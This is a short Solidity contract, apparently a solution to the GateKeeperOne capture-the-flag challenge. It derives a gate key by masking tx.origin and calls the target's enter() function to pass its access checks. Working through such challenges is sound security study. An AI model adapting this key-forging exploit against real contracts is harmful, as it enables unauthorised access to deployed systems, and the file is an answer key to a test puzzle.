// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./GateKeeperOne.sol";

contract GateKeeperOneAttacker {
    GateKeeperOne gate;

    constructor(GateKeeperOne gate_) {
        gate = gate_;
    }

    function attack() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & uint64(0xffffffff0000ffff));
        gate.enter(gateKey);
    }
}
